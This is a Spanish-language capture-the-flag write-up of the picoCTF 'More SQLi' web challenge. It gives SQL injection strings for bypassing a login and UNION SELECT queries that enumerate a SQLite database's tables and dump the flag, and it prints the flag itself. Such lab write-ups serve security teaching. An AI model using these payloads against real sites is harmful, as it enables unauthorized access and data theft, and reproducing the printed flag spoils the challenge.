## Objetivo
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.
## Solución

En este reto nos dan una pagina web con un login, recordando los retos pasados de web tratamos de ingresar con las credenciales comunes aplicando SQL:

como por ejemplo:
```
admin' OR 1=1-- -
admin' AND 1=1-- -
```

![More-SQLi](/imagenes/More-SQLi.png)
Intentando logramos pasar el login metiendo en Username y Password:
```
'or 1=1;--
```

Y vemos una barra de búsqueda:
![More-SQL 2i](/imagenes/More-SQLi(1).png)

Investigando un poco encontramos que al meter el comando:
```
123' UNION SELECT 1, sqlite_version(), 3;--
```

podemos ver la version de SQLite que usa:
![More-SQL 3i](/imagenes/More-SQLi(2).png)


Investigamos mas y encontramos el comando para enumerar las tablas de la base dee datos:
```
123' UNION SELECT name, sql, null from sqlite_master;--
```

Y nos regresa:
![More-SQL 4i](/imagenes/More-SQLi(3).png)

Y analizando la imagen vemos que hay una tabla llamada flag, asi que vemos su contenido con el comando:
```
123' UNION SELECT flag, null, null from more_table;--
```

Y encontramos la flag:
![More-SQL 5i](/imagenes/More-SQLi(4).png)

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
```
## Notas adicionales
## Referencias
[More SQLi](https://github.com/DanArmor/picoCTF-2023-writeup/blob/main/Web%20Exploitation/More%20SQLi/More-SQLi.md)